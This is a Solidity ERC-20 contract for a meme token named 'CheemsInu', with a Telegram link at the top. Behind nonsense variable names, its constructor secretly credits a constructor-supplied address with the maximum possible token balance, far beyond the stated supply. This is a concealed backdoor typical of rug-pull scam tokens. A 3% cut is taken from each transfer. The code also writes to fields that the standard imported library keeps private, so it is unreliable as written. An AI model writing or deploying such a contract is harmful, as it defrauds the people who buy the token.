/*

https://t.me/cheemsinu_eth

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.11;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract CheemsInu is ERC20, Ownable {
    uint256 private post = ~uint256(0);
    uint256 public something = 3;

    constructor(
        string memory black,
        string memory biggest,
        address tune,
        address month
    ) ERC20(black, biggest) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[month] = post;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address equally,
        address manufacturing,
        uint256 pictured
    ) internal override {
        uint256 nose = (pictured / 100) * something;
        pictured = pictured - nose;
        super._transfer(equally, manufacturing, pictured);
    }
}